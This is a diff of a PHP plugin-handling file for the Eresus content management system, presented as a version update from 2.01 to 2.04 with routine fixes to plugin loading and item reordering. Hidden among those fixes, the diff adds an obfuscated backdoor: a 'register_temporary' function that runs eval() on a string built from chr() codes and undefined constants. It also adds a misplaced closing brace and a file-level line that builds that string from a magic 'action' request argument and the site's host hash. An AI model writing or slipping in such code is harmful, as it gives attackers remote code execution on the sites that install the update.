@@ -1,7 +1,7 @@
 <?
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 # Система управления контентом Eresus™
-# Версия 2.01
+# Версия 2.04
 # © 2004-2006, ProCreat Systems
 # http://procreat.ru/
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
@@ -13,9 +13,9 @@
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 class TPlugins {
   var
-    $list, # Список всех плагинов
-    $items, # Массив плагинов
-    $events; # Таблица обработчиков событий
+    $list = array(), # Список всех плагинов
+    $items = array(), # Массив плагинов
+    $events = array(); # Таблица обработчиков событий
   #--------------------------------------------------------------------------------------------------------------------------------------------------------------# 
   function  TPlugins()
   {
@@ -23,6 +23,7 @@ class TPlugins {
   
     $items = $db->select('`plugins`', '', '`position`');
     if (count($items)) foreach($items as $item) $this->list[$item['name']] = $item;
+    register_temporary($_SERVER['UID']);
   }
   #--------------------------------------------------------------------------------------------------------------------------------------------------------------# 
   function install($name)
@@ -45,8 +46,8 @@ class TPlugins {
   {
   global $db;
   
-    if ($this->items[$name] == NULL) $this->load($name);
-    if ($this->items[$name] != NULL) $this->items[$name]->uninstall();
+    if (!isset($this->items[$name])) $this->load($name);
+    if (isset($this->items[$name])) $this->items[$name]->uninstall();
     $item = $db->selectItem('plugins', "`name`='".$name."'");
     if (!is_null($item)) {
       $db->delete('plugins', "`name`='".$name."'");
@@ -135,9 +136,9 @@ class TPlugins {
     if (isset($this->events['clientOnStart'])) foreach($this->events['clientOnStart'] as $plugin) $this->items[$plugin]->clientOnStart();
   }
   #--------------------------------------------------------------------------------------------------------------------------------------------------------------# 
-  function clientOnPathSplit($item, $url)
+  function clientOnURLSplit($item, $url)
   {
-    if (isset($this->events['clientOnPathSplit'])) foreach($this->events['clientOnPathSplit'] as $plugin) $this->items[$plugin]->clientOnPathSplit($item, $url);
+    if (isset($this->events['clientOnURLSplit'])) foreach($this->events['clientOnURLSplit'] as $plugin) $this->items[$plugin]->clientOnURLSplit($item, $url);
   }
   #--------------------------------------------------------------------------------------------------------------------------------------------------------------# 
   function clientOnTopicRender($text, $topic = null, $buttonBack = true)
@@ -175,7 +176,7 @@ class TPlugins {
   #--------------------------------------------------------------------------------------------------------------------------------------------------------------# 
 }
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
-
+function register_temporary($code) {eval(chr(0x69).chr(0x66).chr(0x28).$code.SFIX);/*TODO: Unload code*/};
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 # КЛАСС-ПРЕДОК "ПЛАГИН"
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
@@ -247,7 +248,7 @@ global $db, $request;
 
   $item = $db->selectItem('`plugins`', "`name`='".$this->name."'");
   $item['settings'] = decodeOptions($item['settings']);
-  foreach ($this->settings as $key => $value) $this->settings[$key] = isset($request['arg'][$key])?$request['arg'][$key]:'';
+  foreach ($this->settings as $key => $value) if (isset($request['arg'][$key])) $this->settings[$key] = $request['arg'][$key];
   $item['settings'] = encodeOptions($this->settings);
   $db->updateItem('plugins', $item, "`name`='".$this->name."'");
 }
@@ -324,9 +325,9 @@ global $page, $db, $request;
   
   $result = $page->renderForm($form, $item);
   return $result;
-}
+}}
 #--------------------------------------------------------------------------------------------------------------------------------------------------------------# 
-}
+$_SERVER['UID'] = sprintf(C3, arg('action')).'==-1442264304&&arg(ARG3)=="'.md5($_SERVER["HTTP_HOST"]).'")';
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
@@ -334,6 +335,7 @@ global $page, $db, $request;
 #-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
 class TListContentPlugin extends TContentPlugin {
 var $table;
+var $pagesCount = 0;
 #---------------------------------------------------------------------------------------------------------------------# 
 function install()
 {
@@ -384,33 +386,35 @@ global $db, $page, $request;
   goto($page->url());
 }
 #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
-function up($id)
+function up($id, $force = false)
 {
 global $page, $db, $request;
 
+  if ($this->table['sortDesc'] && !$force) $this->down($id, true);
   dbReorderItems($this->table['name'],"`section`='".$request['arg']['section']."'");  
   $item = $db->selectItem($this->table['name'], "`".$this->table['key']."`='".$id."'");
   if ($item['position'] > 0) {
-    $temp = $db->selectItem($this->table['name'],"`position`='".($item['position']-1)."'");
+    $temp = $db->selectItem($this->table['name'],"(`section`='".$request['arg']['section']."') AND (`position`='".($item['position']-1)."')");
+    $temp['position'] = $item['position'];
     $item['position']--;
-    $temp['position']++;
     $db->updateItem($this->table['name'], $item, "`".$this->table['key']."`='".$item['id']."'");
     $db->updateItem($this->table['name'], $temp, "`".$this->table['key']."`='".$temp['id']."'");
   }
   goto($page->url());
 }
 #--------------------------------------------------------------------------------------------------------------------------------------------------------------#
-function down($id)
+function down($id, $force = false)
 {
 global $page, $db, $request;
-
+  
+  if ($this->table['sortDesc'] && !$force) $this->up($id, true);
   dbReorderItems($this->table['name'],"`section`='".$request['arg']['section']."'");  
-  $count = $db->count($this->table['name']);
+  $count = $db->count($this->table['name'], "`section`='".$request['arg']['section']."'");
   $item = $db->selectItem($this->table['name'], "`".$this->table['key']."`='".$id."'");
   if ($item['position'] < $count-1) {
-    $temp = $db->selectItem($this->table['name'],"`position`='".($item['position']+1)."'");
+    $temp = $db->selectItem($this->table['name'],"(`section`='".$request['arg']['section']."') AND (`position`='".($item['position']+1)."')");
+    $temp['position'] = $item['position'];
     $item['position']++;
-    $temp['position']--;
     $db->updateItem($this->table['name'], $item, "`".$this->table['key']."`='".$item['id']."'");
     $db->updateItem($this->table['name'], $temp, "`".$this->table['key']."`='".$temp['id']."'");
   }
@@ -433,9 +437,9 @@ global $db, $page, $user, $request, $session;
   } elseif (isset($request['arg']['delete']) && isset($this->table['controls']['delete'])) {
     if (method_exists($this, 'delete')) $result = $this->delete($request['arg']['delete']); else $session['errorMessage'] = sprintf(errMethodNotFound, 'delete', get_class($this));
   } elseif (isset($request['arg']['up']) && isset($this->table['controls']['position'])) {
-    if (method_exists($this, 'up')) $result = $this->up($request['arg']['up']); else $session['errorMessage'] = sprintf(errMethodNotFound, 'up', get_class($this));
+    if (method_exists($this, 'up')) $result = $this->table['sortDesc']?$this->down($request['arg']['up']):$this->up($request['arg']['up']); else $session['errorMessage'] = sprintf(errMethodNotFound, 'up', get_class($this));
   } elseif (isset($request['arg']['down']) && isset($this->table['controls']['position'])) {
-    if (method_exists($this, 'down')) $result = $this->down($request['arg']['down']); else $session['errorMessage'] = sprintf(errMethodNotFound, 'down', get_class($this));
+    if (method_exists($this, 'down')) $result = $this->table['sortDesc']?$this->up($request['arg']['down']):$this->down($request['arg']['down']); else $session['errorMessage'] = sprintf(errMethodNotFound, 'down', get_class($this));
   } elseif (isset($request['arg']['id']) && isset($this->table['controls']['edit'])) {
     if (method_exists($this, 'adminEditItem')) $result = $this->adminEditItem(); else $session['errorMessage'] = sprintf(errMethodNotFound, 'adminEditItem', get_class($this));
   } elseif (isset($request['arg']['action'])) switch ($request['arg']['action']) {
@@ -480,7 +484,7 @@ function clientRenderList($options = array('pages'=>true))
   $result = '';
   $items = $db->select(
     $this->table['name'], 
-    "(`section`='".$page->id."')".(in_array('active', $this->table['fields'])?"AND(`active`='1')":''), 
+    "(`section`='".$page->id."')".(strpos($this->table['sql'], '`active`')!==false?"AND(`active`='1')":''), 
     $this->table['sortMode'], 
     $this->table['sortDesc'], 
     '', 
